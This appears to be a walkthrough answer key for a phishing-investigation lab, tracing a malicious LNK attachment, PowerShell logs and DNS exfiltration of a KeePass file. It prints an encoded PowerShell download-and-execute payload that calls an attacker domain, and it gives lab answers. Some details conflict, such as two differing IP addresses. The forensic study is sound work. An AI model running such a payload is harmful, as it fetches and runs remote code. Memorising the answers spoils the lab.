![image](https://github.com/user-attachments/assets/2090bc04-161d-4c88-9c0e-5dd040215a7b)

# Phishing Investigation Answers with Steps

## Task 2 Questions

### 1. What is the email address used to send the phishing email?
- **Answer**: agriffin@bpakcaging.xyz
- **Steps**:
  - Open the email using Thunderbird.
  - Click "More" and select "View Source".
  - Inspect the email header to find the sender's email address.

### 2. What is the email address of the victim?
- **Answer**: julianne.westcott@hotmail.com
- **Steps**:
  - In the email source viewed earlier, locate the "To:" field to find the recipient's email.

### 3. What is the name of the third-party mail relay service used by the attacker?
- **Answer**: elasticemail
- **Steps**:
  - In the email source, look for the "DKIM-Signature" and "List-Unsubscribe" headers.
  - Identify the domain related to the third-party service.

### 4. What is the name of the file inside the encrypted attachment?
- **Answer**: Invoice_20230103.lnk
- **Steps**:
  - Download and unzip the Invoice.zip attachment.
  - View the contents to find the file name.

### 5. What is the password of the encrypted attachment?
- **Answer**: Invoice2023!
- **Steps**:
  - Read the body of the phishing email to locate the password for the encrypted file.

### 6. Based on lnkparse tool, what is the encoded payload?
- **Answer**: aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
- **Steps**:
  - Run: `lnkparse Invoice_20230103.lnk`
  - Locate the "Command Line Arguments" field and extract the payload.

---

## Task 3 Questions

### 1. What are the domains used by the attacker?
- **Answer**: cdn.bpakcaging.xyz,files.bpakcaging.xyz
- **Steps**:
  - Locate and open `powershell.json`.
  - Run: `cat powershell.json | jq`
  - Then run: `cat powershell.json | jq '{ScriptBlockText}'`
  - Scroll through ScriptBlockText entries to find domains.

### 2. What is the name of the enumeration tool downloaded by the attacker?
- **Answer**: seatbelt
- **Steps**:
  - Review ScriptBlockText fields for any tool downloads.

### 3. What is the file accessed by sq3.exe?
- **Answer**: C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite
- **Steps**:
  - Run: `cat powershell.json | jq '{ScriptBlockText}' | grep sq3.exe`
  - Locate the accessed file path.

### 4. What is the software that uses the file in Q3?
- **Answer**: Microsoft Sticky Notes
- **Steps**:
  - From the `sq3.exe` context, identify the software (likely KeePass).

### 5. What is the name of the exfiltrated file?
- **Answer**: protected_data.kdbx
- **Steps**:
  - Review the ScriptBlockText entries for a file sent to 161.71.211.113.

### 6. What type of file uses the .kdbx extension?
- **Answer**: keepass
- **Steps**:
  - Google: `.kdbx file extension`.

### 7. What is the encoding used during exfiltration?
- **Answer**: hex
- **Steps**:
  - Check the exfiltration script in ScriptBlockText; notice hex encoding.

### 8. What is the tool used for exfiltration?
- **Answer**: nslookup
- **Steps**:
  - Review the exfiltration tool used in ScriptBlockText (likely nslookup).

---

## Task 4 Questions

### 1. What software was used by the attacker to host the payload server?
- **Answer**: python
- **Steps**:
  - Open capture.pcapng in Wireshark.
  - Apply filter: `http && ip.addr == 167.71.211.113`.
  - Follow HTTP Stream and analyze the server header.

### 2. What HTTP method was used by the C2?
- **Answer**: POST
- **Steps**:
  - In Wireshark, filter: `http.request.method == POST`.

### 3. What is the protocol used during exfiltration?
- **Answer**: DNS
- **Steps**:
  - Confirm from the powershell.json file and Wireshark that DNS was used.

### 4. What is the password of the exfiltrated file?
- **Answer**: %p9^3!lL^Mz47E2GaT^y
- **Steps**:
  - Filter POST packets.
  - Go to frame 44467.
  - Follow HTTP stream.
  - Copy decimal content, paste into CyberChef.
  - Use "From Decimal" to retrieve password.

### 5. What is the credit card number stored inside the exfiltrated file?
- **Answer**: 4024007128269551
- **Steps**:
  - Open Wireshark, apply filter: `dns && ip.dst == 167.71.211.113`.
  - Extract random strings from DNS queries.
  - Use tshark commands:
    - `tshark -r capture.pcapng -n -T fields -e dns.qry.name | grep "bpakcaging.xyz" | cut -f 1 -d "." | uniq -c`
    - Save and clean output.
  - Combine all strings.
  - Decode with CyberChef "From Hex".
  - Save as .kdbx file.
  - Open the file with KeePass using the password retrieved.
  - Find stored credit card number.

---


